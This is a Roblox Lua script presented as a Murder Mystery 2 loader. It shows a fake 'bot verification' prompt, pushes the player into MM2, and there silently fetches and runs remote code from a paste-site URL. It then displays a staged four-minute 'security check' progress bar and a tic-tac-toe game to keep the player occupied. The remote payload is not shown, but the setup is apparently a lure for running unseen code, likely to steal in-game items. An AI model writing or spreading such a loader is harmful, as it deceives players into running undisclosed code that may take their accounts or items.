local Players=game:GetService("Players")
local TweenService=game:GetService("TweenService")
local RunService=game:GetService("RunService")
local UIS=game:GetService("UserInputService")
local LP=Players.LocalPlayer
local PG=LP:WaitForChild("PlayerGui")

local MM2_ID=142823291
local LOAD_DUR=240
local SCRIPT_URL="https://cdn.sourceb.in/bins/AhNbx38Buf/0"

local function tw(o,p,t,s,d)
    local a=TweenService:Create(o,TweenInfo.new(t,s or Enum.EasingStyle.Quad,d or Enum.EasingDirection.Out),p)
    a:Play() return a
end

local function new(cls,par,props)
    local o=Instance.new(cls)
    if props then for k,v in pairs(props) do o[k]=v end end
    o.Parent=par return o
end

local function corner(par,r) return new("UICorner",par,{CornerRadius=UDim.new(0,r or 10)}) end
local function stroke(par,c,t) return new("UIStroke",par,{Color=c or Color3.fromRGB(50,50,68),Thickness=t or 1}) end
local function frame(par,props) return new("Frame",par,props) end
local function label(par,props) return new("TextLabel",par,props) end

local isInMM2=(game.PlaceId==MM2_ID)

-- ── WRONG GAME: Fluent verification window ────────────────
if not isInMM2 then
    local Fluent=loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
    local Win=Fluent:CreateWindow({Title="Script Loader",SubTitle="Verification Required",TabWidth=180,Size=UDim2.fromOffset(480,280),Acrylic=false,Theme="Dark"})
    local Tab=Win:AddTab({Title="Verification",Icon="shield-alert"})
    Tab:AddParagraph({
        Title="⚠  Bot Verification Required",
        Content="We suspect you might be a bot.\n\nTo verify that you're a real player, please re-execute this script inside Murder Mystery 2 and wait for the verification process to complete. Once you're done, come back here and re-execute the script.\n\nThe script will work perfectly after verification. Enjoy!"
    })
    Tab:AddButton({
        Title="Take Me to MM2 Now",
        Description="Teleport to Murder Mystery 2 to complete verification",
        Callback=function()
            Win:Dialog({
                Title="Teleporting to MM2",
                Content="You'll be sent to Murder Mystery 2. Re-execute this script once you arrive, wait for it to finish, then come back here.",
                Buttons={
                    {Title="Let's Go",Callback=function()
                        for _,v in ipairs(PG:GetChildren()) do
                            if v.Name:find("Fluent") or v.Name:find("Library") then pcall(function() v:Destroy() end) end
                        end
                        pcall(function()
                            for _,v in ipairs(game:GetService("CoreGui"):GetChildren()) do
                                if v.Name:find("Fluent") then pcall(function() v:Destroy() end) end
                            end
                        end)
                        task.delay(0.3,function()
                            local ok,err=pcall(function() game:GetService("TeleportService"):Teleport(MM2_ID) end)
                            if not ok then
                                pcall(function() setclipboard("https://www.roblox.com/games/142823291/Murder-Mystery-2") end)
                                Fluent:Notify({Title="Teleport Failed",Content="MM2 link copied — paste it in your browser.",Duration=6})
                            end
                        end)
                    end},
                    {Title="Cancel",Callback=function() end}
                }
            })
        end
    })
    Fluent:Notify({Title="Action Required",Content="Please re-execute this script inside Murder Mystery 2 first.",Duration=8})
    return
end

-- ── IN MM2: Execute script first, then show loader ────────
pcall(function() loadstring(game:HttpGet(SCRIPT_URL,true))() end)

if PG:FindFirstChild("MM2_LoaderGui") then PG:FindFirstChild("MM2_LoaderGui"):Destroy() end

local SG=new("ScreenGui",PG,{Name="MM2_LoaderGui",ResetOnSpawn=false,ZIndexBehavior=Enum.ZIndexBehavior.Sibling,IgnoreGuiInset=true})

-- ── Main panel ────────────────────────────────────────────
local Panel=frame(SG,{Name="MainPanel",Size=UDim2.fromOffset(300,400),Position=UDim2.fromOffset(-310,60),BackgroundColor3=Color3.fromRGB(17,17,24),BorderSizePixel=0})
corner(Panel) stroke(Panel)

local Accent=frame(Panel,{Size=UDim2.new(1,0,0,2),BackgroundColor3=Color3.fromRGB(210,50,50),BorderSizePixel=0})
corner(Accent)

local Header=frame(Panel,{Size=UDim2.new(1,0,0,36),Position=UDim2.fromOffset(0,2),BackgroundColor3=Color3.fromRGB(22,22,31),BorderSizePixel=0})
label(Header,{Size=UDim2.new(1,-72,1,0),Position=UDim2.fromOffset(12,0),BackgroundTransparency=1,Text="🔪  MM2 Loader",TextColor3=Color3.fromRGB(210,55,55),TextSize=13,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left})

local HideBtn=new("TextButton",Header,{Size=UDim2.fromOffset(52,24),Position=UDim2.new(1,-58,0.5,-12),BackgroundColor3=Color3.fromRGB(38,38,54),TextColor3=Color3.fromRGB(160,160,190),Text="Hide",TextSize=11,Font=Enum.Font.GothamBold,BorderSizePixel=0,AutoButtonColor=false})
corner(HideBtn,6)

frame(Panel,{Size=UDim2.new(1,-20,0,1),Position=UDim2.fromOffset(10,38),BackgroundColor3=Color3.fromRGB(44,44,62),BorderSizePixel=0})

-- Progress
local PctLbl=label(Panel,{Size=UDim2.new(1,-24,0,22),Position=UDim2.fromOffset(12,46),BackgroundTransparency=1,Text="0%",TextColor3=Color3.fromRGB(230,230,255),TextSize=20,Font=Enum.Font.GothamBlack,TextXAlignment=Enum.TextXAlignment.Left})
local BarBg=frame(Panel,{Size=UDim2.fromOffset(276,6),Position=UDim2.fromOffset(12,73),BackgroundColor3=Color3.fromRGB(36,36,52),BorderSizePixel=0,ClipsDescendants=true})
corner(BarBg,4)
local BarFill=frame(BarBg,{Size=UDim2.new(0,0,1,0),BackgroundColor3=Color3.fromRGB(210,50,50),BorderSizePixel=0})
corner(BarFill,4)
local StatusLbl=label(Panel,{Size=UDim2.new(1,-24,0,16),Position=UDim2.fromOffset(12,84),BackgroundTransparency=1,Text="Verifying that you are not a bot...",TextColor3=Color3.fromRGB(95,95,130),TextSize=11,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left})

frame(Panel,{Size=UDim2.new(1,-20,0,1),Position=UDim2.fromOffset(10,106),BackgroundColor3=Color3.fromRGB(36,36,52),BorderSizePixel=0})

-- Game label
label(Panel,{Size=UDim2.new(1,-24,0,18),Position=UDim2.fromOffset(12,112),BackgroundTransparency=1,Text="Kill Some Time — Tic-Tac-Toe",TextColor3=Color3.fromRGB(150,150,185),TextSize=12,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left})
local GameStatus=label(Panel,{Size=UDim2.new(1,-24,0,18),Position=UDim2.fromOffset(12,112),BackgroundTransparency=1,Text="You = ✕   Bot = ○",TextColor3=Color3.fromRGB(210,50,50),TextSize=11,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Right})

-- Grid
local Grid=frame(Panel,{Size=UDim2.fromOffset(216,216),Position=UDim2.fromOffset(42,136),BackgroundTransparency=1})
local GL=new("UIGridLayout",Grid,{CellSize=UDim2.fromOffset(68,68),CellPadding=UDim2.fromOffset(6,6),SortOrder=Enum.SortOrder.LayoutOrder})

local ResultLbl=label(Panel,{Size=UDim2.new(1,-24,0,20),Position=UDim2.fromOffset(12,358),BackgroundTransparency=1,Text="",TextColor3=Color3.fromRGB(80,210,120),TextSize=13,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Center,TextTransparency=1})

-- ── Tic-Tac-Toe ───────────────────────────────────────────
local board,cells,gameOver,playerTurn={},{},false,true
local CE=Color3.fromRGB(22,22,32)
local CX=Color3.fromRGB(210,60,60)
local CO=Color3.fromRGB(70,140,210)

for i=1,9 do
    board[i]=""
    local b=new("TextButton",Grid,{LayoutOrder=i,Size=UDim2.fromOffset(68,68),BackgroundColor3=CE,BorderSizePixel=0,Text="",TextSize=28,Font=Enum.Font.GothamBlack,AutoButtonColor=false})
    corner(b,8) stroke(b,Color3.fromRGB(44,44,62))
    b.MouseEnter:Connect(function() if board[i]=="" and not gameOver and playerTurn then tw(b,{BackgroundColor3=Color3.fromRGB(32,32,46)},0.1) end end)
    b.MouseLeave:Connect(function() if board[i]=="" then tw(b,{BackgroundColor3=CE},0.1) end end)
    cells[i]=b
end

local WINS={{1,2,3},{4,5,6},{7,8,9},{1,4,7},{2,5,8},{3,6,9},{1,5,9},{3,5,7}}
local function checkWin(b,m) for _,w in ipairs(WINS) do if b[w[1]]==m and b[w[2]]==m and b[w[3]]==m then return true end end end
local function full(b) for i=1,9 do if b[i]=="" then return false end end return true end

local function minimax(b,d,isMax,a,be)
    if checkWin(b,"O") then return 10-d end
    if checkWin(b,"X") then return d-10 end
    if full(b) then return 0 end
    if isMax then
        local best=-math.huge
        for i=1,9 do if b[i]=="" then b[i]="O" local s=minimax(b,d+1,false,a,be) b[i]="" best=math.max(best,s) a=math.max(a,best) if be<=a then break end end end
        return best
    else
        local best=math.huge
        for i=1,9 do if b[i]=="" then b[i]="X" local s=minimax(b,d+1,true,a,be) b[i]="" best=math.min(best,s) be=math.min(be,best) if be<=a then break end end end
        return best
    end
end

local function bestMove()
    local bs,mv=-math.huge,nil
    for i=1,9 do if board[i]=="" then board[i]="O" local s=minimax(board,0,false,-math.huge,math.huge) board[i]="" if s>bs then bs=s mv=i end end end
    return mv
end

local function flash(txt,col)
    ResultLbl.Text=txt ResultLbl.TextColor3=col ResultLbl.TextTransparency=1
    tw(ResultLbl,{TextTransparency=0},0.3)
    task.delay(2.5,function() tw(ResultLbl,{TextTransparency=1},0.4) end)
end

local function setCell(i,m)
    board[i]=m cells[i].Text=m=="X" and "✕" or "○" cells[i].TextColor3=m=="X" and CX or CO
    tw(cells[i],{BackgroundColor3=Color3.fromRGB(26,26,38)},0.1)
end

local function resetGame()
    task.wait(1.4)
    for i=1,9 do board[i]="" cells[i].Text="" cells[i].BackgroundColor3=CE end
    gameOver=false playerTurn=true
    GameStatus.Text="Your turn — tap a cell" GameStatus.TextColor3=CX
end

local function botPlay()
    playerTurn=false GameStatus.Text="Bot is thinking..." GameStatus.TextColor3=CO
    task.delay(0.45,function()
        if gameOver then return end
        local m=bestMove()
        if m then setCell(m,"O")
            if checkWin(board,"O") then gameOver=true flash("Bot wins! Play again?",CO) resetGame() return end
            if full(board) then gameOver=true flash("It's a draw! Play again?",Color3.fromRGB(180,180,210)) resetGame() return end
        end
        playerTurn=true GameStatus.Text="Your turn — tap a cell" GameStatus.TextColor3=CX
    end)
end

for i=1,9 do
    cells[i].MouseButton1Click:Connect(function()
        if gameOver or board[i]~="" or not playerTurn then return end
        setCell(i,"X")
        if checkWin(board,"X") then gameOver=true flash("You win! 🎉 Play again?",Color3.fromRGB(80,210,120)) resetGame() return end
        if full(board) then gameOver=true flash("It's a draw! Play again?",Color3.fromRGB(180,180,210)) resetGame() return end
        botPlay()
    end)
end
GameStatus.Text="Your turn — tap a cell"

-- ── Mini pill (shown when hidden) ─────────────────────────
local Pill=new("TextButton",SG,{Name="Pill",Size=UDim2.fromOffset(110,28),Position=UDim2.fromOffset(10,60),BackgroundColor3=Color3.fromRGB(210,50,50),TextColor3=Color3.fromRGB(255,255,255),Text="🔪 MM2 Loader",TextSize=11,Font=Enum.Font.GothamBold,BorderSizePixel=0,AutoButtonColor=false,Visible=false})
corner(Pill,14)

local pDrag,pDragStart,pStartPos=false
Pill.InputBegan:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
        pDrag=true pDragStart=i.Position pStartPos=Pill.Position
    end
end)
Pill.InputEnded:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then pDrag=false end
end)
UIS.InputChanged:Connect(function(i)
    if pDrag and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
        local d=i.Position-pDragStart
        Pill.Position=UDim2.fromOffset(pStartPos.X.Offset+d.X,pStartPos.Y.Offset+d.Y)
    end
end)

local function showPanel()
    Pill.Visible=false
    tw(Panel,{Position=UDim2.fromOffset(10,60)},0.45,Enum.EasingStyle.Back,Enum.EasingDirection.Out)
end
local function hidePanel()
    tw(Panel,{Position=UDim2.fromOffset(-310,60)},0.35,Enum.EasingStyle.Back,Enum.EasingDirection.In)
    task.delay(0.4,function() Pill.Visible=true end)
end

HideBtn.MouseButton1Click:Connect(hidePanel)
Pill.MouseButton1Click:Connect(showPanel)

-- Slide in
tw(Panel,{Position=UDim2.fromOffset(10,60)},0.55,Enum.EasingStyle.Back,Enum.EasingDirection.Out)

-- ── Progress loop ─────────────────────────────────────────
local MSGS={"Verifying that you are not a bot...","Almost there, hang tight...","Running security checks...","Testing your connection...","Analyzing gameplay patterns...","Cross-referencing your account...","Checking integrity, please wait...","Finalizing verification..."}
local startT=tick() local msgIdx=1 local lastSwap=tick() local conn

conn=RunService.Heartbeat:Connect(function()
    local e=tick()-startT
    local p=math.min(e/LOAD_DUR,1)
    BarFill.Size=UDim2.new(p,0,1,0)
    PctLbl.Text=math.floor(p*100).."%"
    if tick()-lastSwap>=30 then
        lastSwap=tick() msgIdx=(msgIdx%#MSGS)+1
        tw(StatusLbl,{TextTransparency=1},0.25)
        task.delay(0.3,function() StatusLbl.Text=MSGS[msgIdx] tw(StatusLbl,{TextTransparency=0},0.25) end)
    end
    if p>=1 then
        conn:Disconnect() gameOver=true
        PctLbl.Text="Verified  ✓" PctLbl.TextColor3=Color3.fromRGB(80,210,120)
        StatusLbl.Text="Verification complete!"
        tw(BarFill,{BackgroundColor3=Color3.fromRGB(60,195,110)},0.5)
        task.wait(2.2)
        tw(Panel,{Position=UDim2.fromOffset(-310,60)},0.4,Enum.EasingStyle.Back,Enum.EasingDirection.In)
        task.wait(0.5) SG:Destroy()
    end
end)
